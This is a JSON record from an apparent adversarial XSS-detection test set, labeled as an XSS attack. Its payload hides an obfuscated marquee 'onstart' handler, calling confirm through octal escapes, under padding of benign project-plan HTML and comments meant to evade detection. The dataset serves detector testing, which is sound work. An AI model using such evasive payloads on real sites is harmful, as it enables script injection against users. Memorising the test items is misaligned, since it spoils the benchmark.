{"payload":"<!-- project plan phase 1 inspection phase 2 framing phase 3 wiring phase 4 plumbing phase 5 finishing phase 6 cleanup phase 7 handover notes permits approved materials delivered schedule updated budget reviewed --><section><h3>Project plan</h3><p>The inspection was completed and the schedule was updated with no open items.</p><p>Materials were delivered and the permits were archived with the project folder.</p><p>The budget was reviewed and the change log was recorded in the shared register.</p><p>The handover checklist was verified and the final folder was organized for the next cycle.</p><ul><li>phase 1 inspection</li><li>phase 2 framing</li><li>phase 3 wiring</li><li>phase 4 plumbing</li><li>phase 5 finishing</li><li>phase 6 cleanup</li><li>phase 7 handover</li></ul><table><tbody><tr><td>permit</td><td>101</td><td>202</td><td>303</td><td>404</td><td>505</td><td>606</td></tr><tr><td>status</td><td>approved</td><td>delivered</td><td>updated</td><td>archived</td><td>recorded</td><td>verified</td></tr><tr><td>notes</td><td>none</td><td>reviewed</td><td>recorded</td><td>complete</td><td>ready</td><td>organized</td></tr><tr><td>budget</td><td>110</td><td>220</td><td>330</td><td>440</td><td>550</td><td>660</td></tr><tr><td>folder</td><td>a</td><td>b</td><td>c</td><td>d</td><td>e</td><td>f</td></tr></tbody></table><p>Final walkthrough was scheduled and the documentation was stored in the shared directory.</p><p>Reference materials were indexed and the summary was routed through the normal review channel.</p></section>\n\n<!-- phase notes complete budget reviewed schedule updated permits archived materials delivered handover verified folder organized -->\n<mArQuEe DaTa-v=\"r\" DaTa-w=\"k\" DaTa-x=\"m\" ClAsS=review-item RoLe=status OnStArT=\"self\n['\\143\\157\\156\\146\\151\\162\\155']\n(-~[])\">summary<!-- summary complete archive ready review complete approval recorded documentation complete budget reviewed schedule updated permits archived materials delivered handover verified folder organized -->","label":1,"attack_category":"xss","source":"test_adversarial_6","split":"adv_test","sample_id":"adv6-001","variant_id":"adv6-001"}
